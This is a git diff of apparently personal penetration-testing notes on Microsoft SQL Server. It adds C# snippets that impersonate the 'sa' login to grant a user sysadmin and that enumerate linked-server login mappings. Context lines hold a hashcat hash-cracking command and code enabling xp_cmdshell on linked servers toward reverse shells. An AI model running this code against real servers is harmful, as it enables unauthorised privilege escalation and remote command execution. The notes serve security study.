@@ -222,11 +222,11 @@ Follow guide [here](https://hex64.net/blog/how-to-recover-sa-password-on-microso
 
 5. Restart the server
 
-![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
 6. Open sqlcmd --> RUN AS ADMINISTRATOR
 
-![](<../.gitbook/assets/image (5) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1) (1).png>)
 
 7. Create new Windows Authentication login for bill user on MSSQL server
 
@@ -237,7 +237,7 @@ go
 
 8. Remove the -m options from the startup parameters
 
-![](<../.gitbook/assets/image (6) (1) (1).png>)
+![](<../.gitbook/assets/image (6) (1) (1) (1).png>)
 
 9. Restart the MSSQL server
 10. Go to Microsoft SQL Server Management Studio & use Windows Authentication login
@@ -557,7 +557,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 
 * Impersonate using EXECUTE AS USER
-  * Impersonates a database user within a single database. ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)
+  * Impersonates a database user within a single database. ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
   * ```csharp
     String querylogin = "SELECT USER_NAME();";
     SqlCommand command = new SqlCommand(querylogin, con);
@@ -631,6 +631,31 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 <details>
 
+<summary>Impersonating sa account &#x26; add user to sysadmin group</summary>
+
+```csharp
+            //WRITE CODE HERE!
+            // impersonate the 'sa' login
+            string impersonateSql = "EXECUTE AS LOGIN = 'sa';";
+            using (var impCmd = new SqlCommand(impersonateSql, con))
+            {
+                impCmd.ExecuteNonQuery();
+            }
+
+            // add 'zabbix' to the sysadmin fixed server role
+            string grantSql = "ALTER SERVER ROLE [sysadmin] ADD MEMBER [zabbix];";
+            using (var grantCmd = new SqlCommand(grantSql, con))
+            {
+                grantCmd.ExecuteNonQuery();
+                Console.WriteLine("Added 'zabbix' to sysadmin role.");
+            }
+            //END OF CODE!
+```
+
+</details>
+
+<details>
+
 <summary>Custom Assembly Code</summary>
 
 ```csharp
@@ -690,7 +715,7 @@ reader.Close();
 * SQL server links are not bidirectional by default
 * Possible to use a bidirectional link to elevate privileges on the same SQL server
 
-- Finding linked servers on SQL server ![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png>)
+- Finding linked servers on SQL server ![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png>)
   * Eg: APPSRV01 linked to DC01
     *   ```csharp
         String execCmd = "EXEC sp_linkedservers;";
@@ -728,8 +753,50 @@ reader.Close();
       ```
 
 
-  * If received `Access to the remote server is denied because no login-mapping exists.` --> Check which accounts are able to use linked servers [here](1433-mssql.md#enumeration-within-sql-server-management-studio)
-- Reverse shell on linked server
+  * If received `Access to the remote server is denied because no login-mapping exists.` --> Check which accounts are able to use linked servers [here](1433-mssql.md#enumeration-within-sql-server-management-studio), or custom code below:
+
+<pre class="language-csharp"><code class="lang-csharp"><strong>            //WRITE CODE HERE!
+</strong>            string sql = @"
+                SELECT
+                    SP.name                     AS LocalLogin,
+                    LL.remote_name              AS RemoteLogin,
+                    CASE WHEN LL.uses_self_credential = 1 THEN 'Yes' ELSE 'No' END AS SelfMapped,
+                    LL.modify_date              AS LastModified
+                FROM sys.servers S
+                JOIN sys.linked_logins LL
+                    ON S.server_id = LL.server_id
+                LEFT JOIN sys.server_principals SP
+                    ON LL.local_principal_id = SP.principal_id
+                WHERE S.name = 'ZSM-SVRCSQL02';
+                ";
+            SqlCommand cmd = new SqlCommand(sql, con);
+            SqlDataReader rdr = cmd.ExecuteReader();
+
+            if (!rdr.HasRows)
+            {
+                Console.WriteLine("No login mappings found for linked server ZSM-SVRCSQL02.");
+            }
+            else
+            {
+                Console.WriteLine("\nMappings for linked server ZSM-SVRCSQL02:\n");
+                Console.WriteLine("{0,-30} {1,-30} {2,-12} {3}", "LocalLogin", "RemoteLogin", "SelfMapped", "LastModified");
+                Console.WriteLine(new string('-', 95));
+
+                while (rdr.Read())
+                {
+                    var local = rdr.IsDBNull(0) ? "&#x3C;NULL>" : rdr.GetString(0);
+                    var remote = rdr.IsDBNull(1) ? "&#x3C;NULL>" : rdr.GetString(1);
+                    var self = rdr.GetString(2);
+                    var modified = rdr.GetDateTime(3);
+                    Console.WriteLine("{0,-30} {1,-30} {2,-12} {3}", local, remote, self, modified);
+                }
+            }
+            rdr.Close();
+            //END OF CODE!
+        
+</code></pre>
+
+* Reverse shell on linked server
   *   ```csharp
       //String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"dc01.corp2.com\";";
       String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;";
@@ -751,7 +818,7 @@ reader.Close();
       ```
 
 
-- Check if DC01 also links back to APPSrv01 ![](<../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png>)
+* Check if DC01 also links back to APPSrv01 ![](<../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png>)
   *   ```csharp
       String execCmd = "EXEC ('sp_linkedservers') AT DC01;";
 
@@ -767,7 +834,7 @@ reader.Close();
       ```
 
 
-- Reverse shell on APPSRV01 from DC01, bi-directional linked servers
+* Reverse shell on APPSRV01 from DC01, bi-directional linked servers
   * ```csharp
     String enable_xpcmd = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;" +
                 "EXEC sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT APPSRV01') AT DC01;";
